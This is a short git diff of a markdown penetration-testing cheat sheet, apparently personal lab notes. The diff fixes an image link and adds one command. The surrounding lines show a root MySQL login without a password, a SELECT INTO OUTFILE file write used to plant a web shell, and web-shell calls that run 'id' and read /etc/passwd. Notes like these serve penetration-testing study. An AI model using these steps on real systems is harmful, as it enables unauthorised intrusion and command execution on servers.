@@ -36,9 +36,10 @@
 - __```mysql -h 10.0.1.22 -u root```__
 - __```select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;```__
   - > __if executed, confirms the ability to write files on the web server.__
-- [Image1](/Image/mysql.png)
+![Image1](/Image/mysql.png)
 - __Now navigate to that path where you write the `shell.php`__
   - > __```<url>/shell.php?cmd=id```__
+  - > __```<url>/shell.php?cmd=cat /etc/passwd```__
 
 ## 3. [SMB](smb.md)
 ### nmblookup
